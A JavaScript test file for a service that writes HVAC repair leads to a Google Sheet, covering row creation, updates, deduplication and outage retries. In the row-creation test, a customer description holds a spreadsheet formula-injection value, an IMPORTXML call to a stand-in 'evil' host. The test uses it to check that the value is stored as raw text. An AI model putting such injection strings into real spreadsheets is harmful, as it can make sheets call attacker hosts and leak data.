import { test, before, after, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { COLUMNS, createSheetsSync, leadToRow } from './sheets.js';
import { createLead, recordContact, book } from './lead.js';
import { startFakeGoogle } from './fakes.js';

// A stand-in for Google (fakes.js): checks the signed sign-in and RAW writes.
let fake;
const google = {
  get grid() { return fake.state.grid; }, set grid(v) { fake.state.grid = v; },
  get down() { return fake.state.down; }, set down(v) { fake.state.down = v; },
  get writes() { return fake.state.writes; },
};
const env = () => fake.env();

const quietLog = () => {
  const lines = [];
  return { lines, error: (m) => lines.push(m) };
};

const request = {
  name: 'Dana Whitfield', phone: '(312) 555-0188', email: 'dana@example.com',
  service: 'ac_repair', description: 'AC blowing warm air since this morning.',
  urgency: 'soon', preferredDate: '2026-10-02', preferredWindow: 'morning',
};
const dataRows = () => google.grid.slice(1);
const col = (row, name) => row[COLUMNS.indexOf(name)];

before(async () => { fake = await startFakeGoogle(); });
after(() => fake.close());
beforeEach(() => fake.reset());

// ---- Settings

test('without Google settings, sync is off and harmless', async () => {
  const off = createSheetsSync({});
  assert.equal(off.enabled, false);
  assert.match(off.status, /sync off/);
  off.sync(createLead(request));
  await off.idle();

  const partial = createSheetsSync({ GOOGLE_SHEET_ID: 'sheet-123' });
  assert.equal(partial.enabled, false);
  assert.match(partial.status, /must all be set/);
});

// ---- The four required behaviours

test('a new lead creates one row, under the header, with every column', async () => {
  const sheets = createSheetsSync(env(), { log: quietLog() });
  const lead = createLead({ ...request, description: '=IMPORTXML("http://evil","//a") Also I smell gas.' });
  await sheets.sync(lead);

  assert.deepEqual(google.grid[0], COLUMNS);
  assert.equal(dataRows().length, 1);
  const row = dataRows()[0];
  assert.equal(row.length, 18);
  assert.equal(col(row, 'Lead ID'), lead.reference);
  assert.equal(col(row, 'Customer Name'), 'Dana Whitfield');
  assert.equal(col(row, 'Service'), 'Air conditioning repair');
  assert.equal(col(row, 'Priority'), 'P1 Urgent');
  assert.equal(col(row, 'Hazard'), 'Gas');
  assert.equal(col(row, 'Lead Status'), 'New');
  assert.equal(col(row, 'Follow-up Needed'), 'Yes');
  assert.match(col(row, 'Received At'), /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/);
  assert.equal(col(row, 'Preferred Time'), 'Morning (8am to 12pm)');
  // Customer text is stored as text, never as a formula.
  assert.ok(col(row, 'Problem').startsWith('=IMPORTXML'));
  assert.ok(google.writes.every((w) => w === 'RAW'));
  sheets.stop();
});

test('a status change updates the same row', async () => {
  const sheets = createSheetsSync(env(), { log: quietLog() });
  let lead = createLead(request);
  await sheets.sync(lead);

  lead = recordContact(lead, { outcome: 'reached', by: 'Maria', note: 'Wants Friday' });
  await sheets.sync(lead);
  lead = book(lead, { date: '2026-10-02', window: 'morning' });
  await sheets.sync(lead);

  assert.equal(dataRows().length, 1);
  const row = dataRows()[0];
  assert.equal(col(row, 'Lead ID'), lead.reference);
  assert.equal(col(row, 'Lead Status'), 'Qualified');
  assert.equal(col(row, 'Booking Status'), 'Booked');
  assert.equal(col(row, 'Follow-up Needed'), 'No');
  assert.equal(col(row, 'Callback Deadline'), '');
  assert.match(col(row, 'Last Contact'), /phone · reached · Maria · Wants Friday$/);
  sheets.stop();
});

test('no duplicate rows: rapid changes, repeats, and rows the owner has moved', async () => {
  const sheets = createSheetsSync(env(), { log: quietLog() });
  const a0 = createLead(request);
  const a1 = recordContact(a0, { outcome: 'reached' });
  const a2 = book(a1, { date: '2026-10-02', window: 'morning' });
  // Fired together, before any has finished: the create and its updates race.
  sheets.sync(a0); sheets.sync(a1); sheets.sync(a2); sheets.sync(a2);
  await sheets.idle();
  assert.equal(dataRows().length, 1);
  assert.equal(col(dataRows()[0], 'Booking Status'), 'Booked', 'the newest version wins');

  // A second lead, then the owner sorts the sheet so the rows swap places.
  const b0 = createLead({ ...request, name: 'Kim Lee' });
  await sheets.sync(b0);
  google.grid = [google.grid[0], google.grid[2], google.grid[1]];
  await sheets.sync(recordContact(b0, { outcome: 'no_answer' }));
  await sheets.sync(a2);

  assert.equal(dataRows().length, 2);
  assert.deepEqual(dataRows().map((r) => col(r, 'Lead ID')).sort(), [a0.reference, b0.reference].sort());
  const kim = dataRows().find((r) => col(r, 'Lead ID') === b0.reference);
  assert.equal(col(kim, 'Customer Name'), 'Kim Lee');
  assert.match(col(kim, 'Last Contact'), /no answer/);
  sheets.stop();
});

test('Google down: nothing thrown, failure logged, row written once Google is back', async () => {
  const log = quietLog();
  let latest = createLead(request);
  const sheets = createSheetsSync(env(), { log, getLead: () => latest });

  google.down = true;
  await sheets.sync(latest); // must not throw
  latest = recordContact(latest, { outcome: 'reached' }); // changed while Google was down
  await sheets.sync(latest);
  assert.equal(google.grid.length, 0);
  assert.equal(sheets.failedCount(), 1);
  assert.match(log.lines[0], new RegExp(`^\\[sheets\\] ${latest.reference} not synced, will retry: .*503`));

  google.down = false;
  await sheets.retryFailed();
  assert.equal(sheets.failedCount(), 0);
  assert.equal(dataRows().length, 1);
  assert.equal(col(dataRows()[0], 'Lead Status'), 'Contacted', 'the retry sends the latest version');
  sheets.stop();
});

test('refuses to write over a tab that holds something else', async () => {
  google.grid = [['Invoice #', 'Amount'], ['1001', '$250']];
  const log = quietLog();
  const sheets = createSheetsSync(env(), { log });
  await sheets.sync(createLead(request));
  assert.deepEqual(google.grid, [['Invoice #', 'Amount'], ['1001', '$250']]);
  assert.match(log.lines[0], /Use an empty tab/);
  sheets.stop();
});

test('leadToRow matches the column list', () => {
  assert.equal(leadToRow(createLead(request)).length, COLUMNS.length);
});

// ---- Through the real server

test('server: submissions and office changes reach the sheet; a Google outage never blocks a customer', async (t) => {
  const tmp = await mkdtemp(join(tmpdir(), 'hvac-sheets-'));
  Object.assign(process.env, env(), { LEADS_FILE: join(tmp, 'leads.jsonl'), OFFICE_TOKEN: 'office-pw', WEBHOOK_URL: '' });
  const { server, sheets } = await import('./server.js');
  server.listen(0);
  const base = `http://127.0.0.1:${server.address().port}`;
  const errors = [];
  t.mock.method(console, 'error', (m) => errors.push(String(m)));
  t.mock.method(console, 'log', () => {});
  t.after(async () => { server.close(); sheets.stop(); await rm(tmp, { recursive: true, force: true }); });

  const submit = (body) => fetch(`${base}/api/requests`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...request, ...body }),
  });
  const office = (path, body) => fetch(`${base}/api/leads${path}`, {
    method: body ? 'POST' : 'GET',
    headers: { Authorization: 'Bearer office-pw', 'Content-Type': 'application/json' },
    body: body && JSON.stringify(body),
  }).then((r) => r.json());

  // Customer submits -> one row.
  const { reference } = await (await submit({})).json();
  await sheets.idle();
  assert.equal(dataRows().length, 1);
  assert.equal(col(dataRows()[0], 'Lead ID'), reference);

  // Owner changes status -> same row updated.
  await office(`/${reference}/contact`, { outcome: 'reached' });
  await office(`/${reference}/qualify`, {});
  await sheets.idle();
  assert.equal(dataRows().length, 1);
  assert.equal(col(dataRows()[0], 'Lead Status'), 'Qualified');

  // Google goes down: the customer still gets their confirmation, the lead is kept.
  google.down = true;
  const res = await submit({ name: 'Ray Ortiz', description: 'Furnace makes a loud bang when it starts.' });
  assert.equal(res.status, 201);
  const { reference: ray } = await res.json();
  await sheets.idle();
  assert.equal(dataRows().length, 1, 'nothing reached the sheet');
  assert.equal((await office(`/${ray}`)).lead.customer.name, 'Ray Ortiz', 'the lead is saved locally');
  assert.ok(errors.some((e) => e.includes(`[sheets] ${ray} not synced`)), 'the failure is logged');

  // Google comes back: the missed lead is written, once.
  google.down = false;
  await sheets.retryFailed();
  assert.equal(dataRows().length, 2);
  assert.deepEqual(dataRows().map((r) => col(r, 'Lead ID')), [reference, ray]);
});
